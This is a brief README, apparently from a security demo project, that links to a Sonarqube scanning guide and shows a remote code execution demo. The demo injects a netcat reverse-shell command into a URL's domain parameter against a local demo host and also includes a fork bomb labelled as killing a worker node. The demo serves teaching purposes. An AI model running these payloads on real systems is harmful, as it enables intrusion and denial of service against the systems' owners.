# Code Security 

## Code scanning

- [Sonarqube](sonarqube/README.md)

## Remote Code execution with Reverse Shell

```bash
# Locally
nc -lvp 8888
# In any browser
http://goto-demo.localtest.me/?domain=www.google.com; nc 192.168.1.32 8888 -e sh

# DANGEROUS! Kills worker node!
fork() {
    fork | fork &
}
fork
```
